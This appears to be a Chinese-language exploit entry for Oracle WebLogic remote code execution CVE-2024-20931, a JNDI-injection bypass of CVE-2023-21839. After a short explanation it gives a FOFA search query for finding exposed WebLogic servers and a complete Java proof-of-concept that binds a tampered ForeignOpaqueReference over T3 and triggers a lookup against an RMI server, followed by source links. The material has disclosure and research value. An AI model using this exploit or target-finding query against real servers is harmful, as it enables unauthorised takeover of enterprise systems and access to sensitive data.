## Weblogic远程代码执行(CVE-2024-20931)

Oracle WebLogic Server是一个用于构建、部署和管理企业级Java应用程序。AQjmsInitialContextFactory 是一个允许应用程序使用JNDI查找方式访问Oracle AQ提供消息服务的工厂类。

ForeignOpaqueReference是一个对象，lookup时会调用getReferent函数，进行远程对象查询。 

该漏洞是 CVE-2023-21839 漏洞绕过，在AQjmsInitialContextFactory初始化时会通过 JNDI获取远程的 DataSource，当通过反射修改 ForeignOpaqueReference 的 jndiEnvironment 和 remoteJNDIName 属性后，再次远程查询ForeignOpaqueReference对象会导致 JNDI 注入，从而直接接管 Oracle WebLogic Server 来执行未经授权的操作或访问系统敏感信息。

## fofa
```
(body="Welcome to WebLogic Server") || (title=="Error 404--Not Found") || (((body="
BEA WebLogic Server" || server="Weblogic" || body="content=\"WebLogic Server" || body="
Welcome to Weblogic Application" || body="
BEA WebLogic Server") && header!="couchdb" && header!="boa" && header!="RouterOS" && header!="X-Generator: Drupal") || (banner="Weblogic" && banner!="couchdb" && banner!="drupal" && banner!=" Apache,Tomcat,Jboss" && banner!="ReeCam IP Camera" && banner!="
Blog Comments
")) || (port="7001" && protocol=="weblogic")
```

## poc
```
package com.supeream;

import weblogic.deployment.jms.ForeignOpaqueReference;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class CVE_2024_209321 {
    public static void main(String[] args) throws Exception {
        String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";

        // 创建用来远程绑定对象的InitialContext
        String url = "t3://127.0.0.1:7001"; // 目标机器
        Hashtable env1 = new Hashtable();
        env1.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env1.put(Context.PROVIDER_URL, url); // 目标
        InitialContext c = new InitialContext(env1);

        // ForeignOpaqueReference的jndiEnvironment属性
        Hashtable env2 = new Hashtable();
        env2.put("java.naming.factory.initial", "oracle.jms.AQjmsInitialContextFactory");
        env2.put("datasource", "rmi://127.0.0.1:1099/ygevmj");

        // ForeignOpaqueReference的jndiEnvironment和remoteJNDIName属性
        ForeignOpaqueReference f = new ForeignOpaqueReference();
        Field jndiEnvironment = ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
        jndiEnvironment.setAccessible(true);
        jndiEnvironment.set(f, env2);
        Field remoteJNDIName = ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");
        remoteJNDIName.setAccessible(true);
        String ldap = "rmi://127.0.0.1:1099/ygevmj";
        remoteJNDIName.set(f, ldap);

        // 远程绑定ForeignOpaqueReference对象
        c.rebind("glassy", f);

        // lookup查询ForeignOpaqueReference对象
        try {
            c.lookup("glassy");
        } catch (Exception e) {
        }
    }
}
```

## 漏洞来源
- https://github.com/GlassyAmadeus/CVE-2024-20931
- https://glassyamadeus.github.io/2024/01/31/CVE_2024_20931/
- https://forum.butian.net/share/2780
